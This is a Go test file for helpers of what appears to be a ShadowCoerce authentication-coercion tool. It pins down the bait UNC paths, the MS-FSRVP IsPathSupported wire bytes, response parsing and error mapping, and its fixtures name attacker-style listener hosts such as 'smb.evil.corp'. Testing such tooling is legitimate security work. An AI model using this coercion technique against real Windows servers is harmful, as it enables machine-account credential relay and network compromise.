package smbclient

import (
	"bytes"
	"errors"
	"os"
	"testing"

	"github.com/mandiant/gopacket/pkg/third_party/smb2"
)

// TestShadowCoerceUNC pins the bait-path convention: \\<listener>\share.
// The share need not exist on the listener — the machine-account SMB
// authentication completes at session setup, before any tree connect (the
// reference PoC's \NETLOGON only makes the follow-up tree connect succeed).
func TestShadowCoerceUNC(t *testing.T) {
	tests := []struct {
		name     string
		listener string
		want     string
	}{
		{name: "IPv4 listener", listener: "192.168.0.5", want: `\\192.168.0.5\share`},
		{name: "hostname listener", listener: "attacker", want: `\\attacker\share`},
		{name: "FQDN listener", listener: "smb.evil.corp", want: `\\smb.evil.corp\share`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := shadowCoerceUNC(tt.listener); got != tt.want {
				t.Errorf("shadowCoerceUNC(%q) = %q, want %q", tt.listener, got, tt.want)
			}
		})
	}
}

// TestIsPathSupportedRequest pins the request NDR against the ShadowCoerce
// reference wire format: ShareName is a top-level [in] [string] LPWSTR,
// marshaled as a REFERENCE pointer (no referent ID) — MaxCount, Offset=0,
// ActualCount in UTF-16 code units INCLUDING the NUL terminator, then the
// UTF-16LE data padded to 4 bytes (impacket dtypes.WSTR agrees: it is a
// bare NDRSTRUCT, not an NDRPOINTER).
func TestIsPathSupportedRequest(t *testing.T) {
	tests := []struct {
		name string
		unc  string
		want []byte
	}{
		{
			// 21 chars + NUL = 22 units = 44 data bytes: already 4-aligned,
			// so no padding follows the terminator.
			name: "even data length carries no padding",
			unc:  `\\192.168.1.100\share`,
			want: []byte{
				0x16, 0, 0, 0, // MaxCount = 22 (code units incl. NUL)
				0, 0, 0, 0, // Offset
				0x16, 0, 0, 0, // ActualCount
				'\\', 0, '\\', 0, '1', 0, '9', 0, '2', 0, '.', 0, '1', 0, '6', 0, '8', 0, '.', 0, '1', 0, '.', 0,
				'1', 0, '0', 0, '0', 0, '\\', 0, 's', 0, 'h', 0, 'a', 0, 'r', 0, 'e', 0, 0, 0,
			},
		},
		{
			// 16 chars + NUL = 17 units = 34 data bytes: 2 pad bytes align
			// the stub to 4.
			name: "odd data length pads to 4-byte boundary",
			unc:  `\\10.0.0.1\share`,
			want: []byte{
				0x11, 0, 0, 0, // MaxCount = 17
				0, 0, 0, 0, // Offset
				0x11, 0, 0, 0, // ActualCount
				'\\', 0, '\\', 0, '1', 0, '0', 0, '.', 0, '0', 0, '.', 0, '0', 0, '.', 0, '1', 0, '\\', 0,
				's', 0, 'h', 0, 'a', 0, 'r', 0, 'e', 0, 0, 0,
				0, 0, // NDR alignment pad
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := isPathSupportedRequest(tt.unc); !bytes.Equal(got, tt.want) {
				t.Errorf("isPathSupportedRequest(%q) = %x, want %x", tt.unc, got, tt.want)
			}
		})
	}
}

// TestIsPathSupportedResult covers the response contract: the method-return
// DWORD is always the trailing 4 bytes, and every status except
// E_ACCESSDENIED means the trigger was delivered (the FSRVP_E_* statuses
// are the routine answers AFTER the callback already fired — the listener
// is the oracle).
func TestIsPathSupportedResult(t *testing.T) {
	tests := []struct {
		name string
		resp []byte
		want string // "" = nil error
	}{
		{
			name: "path supported",
			resp: []byte{
				1, 0, 0, 0, // SupportedByThisProvider = TRUE
				0, 0, 0, 0, // OwnerMachineName = NULL
				0, 0, 0, 0, // return = 0
			},
		},
		{
			name: "FSRVP_E_NOT_SUPPORTED is still a delivered trigger",
			resp: []byte{
				0, 0, 0, 0, 0, 0, 0, 0,
				0x0c, 0x23, 0x04, 0x80, // 0x8004230c
			},
		},
		{
			name: "FSRVP_E_OBJECT_NOT_FOUND is still a delivered trigger",
			resp: []byte{
				0, 0, 0, 0, 0, 0, 0, 0,
				0x08, 0x23, 0x04, 0x80, // 0x80042308
			},
		},
		{
			name: "E_ACCESSDENIED is the one hard failure",
			resp: []byte{
				0, 0, 0, 0, 0, 0, 0, 0,
				0x05, 0x00, 0x07, 0x80, // 0x80070005
			},
			want: "access denied",
		},
		{
			// BOOL + non-NULL OwnerMachineName (referent + deferred "X"
			// string) + return: a fixed-offset read would land on the
			// string's MaxCount (2) and miss the trailing E_ACCESSDENIED.
			name: "non-NULL owner name keeps the return DWORD trailing",
			resp: []byte{
				1, 0, 0, 0, // SupportedByThisProvider = TRUE
				0, 0, 2, 0, // OwnerMachineName referent (non-NULL)
				2, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 'X', 0, 0, 0, // "X"
				0x05, 0x00, 0x07, 0x80, // return = E_ACCESSDENIED
			},
			want: "access denied",
		},
		{
			name: "short response is an error",
			resp: []byte{0, 0, 0, 0, 0, 0, 0, 0},
			want: "short IsPathSupported response (8 bytes)",
		},
		{
			name: "empty response is an error",
			resp: nil,
			want: "short IsPathSupported response (0 bytes)",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := isPathSupportedResult(tt.resp)
			if tt.want == "" {
				if err != nil {
					t.Errorf("isPathSupportedResult(%x) = %v, want nil", tt.resp, err)
				}
				return
			}
			if err == nil || err.Error() != tt.want {
				t.Errorf("isPathSupportedResult(%x) = %v, want %q", tt.resp, err, tt.want)
			}
		})
	}
}

// TestMapFSSAgentError covers the themed error family: the fssagent service
// is disabled by default on Windows Server, so a missing pipe, a rejected
// bind, or an unknown-opnum fault all map to "File Server VSS Agent not
// available" — never a raw NTSTATUS. Unrecognized failures pass through
// untouched.
func TestMapFSSAgentError(t *testing.T) {
	passthrough := errors.New("failed to read Response header: EOF")
	tests := []struct {
		name string
		err  error
		want string // "" = returned unchanged
	}{
		{
			name: "pipe absent (object name not found)",
			err: &os.PathError{Op: "open", Path: `\\target\pipe\FssagentRpc`,
				Err: &smb2.ResponseError{Code: 0xC0000034}}, // STATUS_OBJECT_NAME_NOT_FOUND
			want: "File Server VSS Agent not available on the target (FssagentRpc pipe not found — service disabled or File Server role not installed)",
		},
		{
			name: "pipe absent (object path not found)",
			err:  &smb2.ResponseError{Code: 0xC000003A}, // STATUS_OBJECT_PATH_NOT_FOUND
			want: "File Server VSS Agent not available on the target (FssagentRpc pipe not found — service disabled or File Server role not installed)",
		},
		{
			name: "pipe ACL denial is plain access denied",
			err:  &os.PathError{Op: "open", Path: `\\target\pipe\FssagentRpc`, Err: os.ErrPermission},
			want: "access denied",
		},
		{
			name: "demand-start race lost",
			err:  errors.New("open pipe: An instance of a named pipe cannot be found in the listening state"),
			want: "File Server VSS Agent not available on the target (FssagentRpc pipe not listening — the demand-start service did not come up)",
		},
		{
			name: "bind rejected by the server",
			err:  errors.New("bind FssagentRpc: bind rejected: syntaxes_not_supported"),
			want: "File Server VSS Agent not available on the target (MS-FSRVP interface not registered on the FssagentRpc pipe)",
		},
		{
			name: "interface unregistered fault",
			err:  errors.New("IsPathSupported: RPC Fault: status=0x1c000003"), // nca_s_unk_if
			want: "File Server VSS Agent not available on the target (MS-FSRVP interface not registered on the FssagentRpc pipe)",
		},
		{
			name: "opnum unimplemented fault (Samba)",
			err:  errors.New("IsPathSupported: RPC Fault: status=0x1c010002"), // nca_s_op_rng_error
			want: "File Server VSS Agent not available on the target (MS-FSRVP interface not registered on the FssagentRpc pipe)",
		},
		{
			name: "transport failure passes through",
			err:  passthrough,
		},
		{
			name: "unrelated fault status passes through",
			err:  errors.New("IsPathSupported: RPC Fault: status=0x00000001"),
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := mapFSSAgentError(tt.err)
			if tt.want == "" {
				if got != tt.err {
					t.Errorf("mapFSSAgentError(%v) = %v, want the error unchanged", tt.err, got)
				}
				return
			}
			if got == nil || got.Error() != tt.want {
				t.Errorf("mapFSSAgentError(%v) = %v, want %q", tt.err, got, tt.want)
			}
		})
	}
}
